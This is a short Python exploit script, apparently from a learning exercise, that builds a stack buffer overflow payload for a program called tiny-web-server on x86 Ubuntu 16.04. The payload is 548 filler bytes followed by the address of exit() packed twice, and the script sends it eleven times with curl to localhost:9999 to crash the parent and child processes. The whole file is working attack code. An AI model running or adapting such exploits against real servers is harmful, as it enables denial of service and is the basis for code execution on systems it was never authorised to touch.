#!/usr/bin/env python
## tiny-web-server x86 ret2libc exit() exploit - Ubuntu 16.04
from struct import pack
from os import system
from sys import argv

def build_payload():
    buf_size = int(0)

    # Allow for custome buffer size setting
    if len(argv) != 2:
        buf_size = 548
    else:
        buf_size = argv[1]

    filler = 'A'*int(buf_size)
    exit_addr = pack("<L", 0x08048950)

    # Build the payload
    payload = filler
    payload += exit_addr
    payload += exit_addr

    # Send payload 11 times, 10 for each child process and 1 for the parent
    for children in range(11):
        print("Sending payload of total length {}".format(len(payload)))
        system("/usr/bin/curl localhost:9999/\""+payload+"\"")
